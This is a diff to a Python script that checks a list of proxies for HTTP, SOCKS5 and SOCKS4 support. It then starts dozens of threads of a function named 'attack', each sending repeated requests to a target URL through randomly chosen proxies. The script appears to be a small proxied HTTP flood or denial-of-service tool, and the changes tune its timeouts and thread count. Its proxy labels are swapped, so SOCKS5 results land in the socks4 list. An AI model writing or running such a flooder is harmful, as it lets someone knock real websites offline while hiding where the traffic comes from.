@@ -21,26 +21,32 @@ def get_proxies():
 def check_proxies(proxies):
 	s= requests.Session()
 	for proxy in proxies:
+		b = False
 		try:
 			s.proxies = {"http":proxy,"https":proxy}
-			res = s.get(url,timeout = 6)
+			res = s.get(url,timeout = 1.5)
 			if res :
+				b = True
 				httpproxies.append(proxy)
 		except Exception as e:
+			print("\n Not a http/https proxy")
+		if b == False:
 			try:
 				s.proxies = {"http":"socks5://"+proxy,"https":"socks5://"+proxy}
 				res = s.get(url,timeout = 1.5)
 				if res:
+					b= True
 					socks4proxies.append(proxy)
 			except Exception as e:
-				try:
-					s.proxies = {"http":"socks4://"+proxy,"https":"socks4://"+proxy}
-					res = s.get(url,timeout =1.5)
-					if res:
-						socks5proxies.append(proxy)
-				except Exception as e:
-					print("failed")
-					return 0
+					print("\n Not a socks5 proxy")
+		if b == False:	
+			try:
+				s.proxies = {"http":"socks4://"+proxy,"https":"socks4://"+proxy}
+				res = s.get(url,timeout =1.5)
+				if res:
+					socks5proxies.append(proxy)
+			except Exception as e:
+				print("\n Not a socks4 proxy")
 	print(httpproxies)
 
 
@@ -50,7 +56,7 @@ def attack():
 		hproxy = random.choice(httpproxies)
 		for i in range(2):
 			s.proxies = {"http":hproxy,"https":hproxy}
-			res = s.get(url,timeout = 6)
+			res = s.get(url,timeout = 1.5)
 			print(res.text)
 	if socks4proxies:
 		s4proxy = random.choice(socks4proxies)
@@ -72,7 +78,7 @@ if __name__ == "__main__":
 	print(proxies)
 	print("Party starts in 321..............")
 	check_proxies(proxies)
-	for i in range(300):
+	for i in range(50):
 		t = threading.Thread(target=attack)
 		t.start()
 
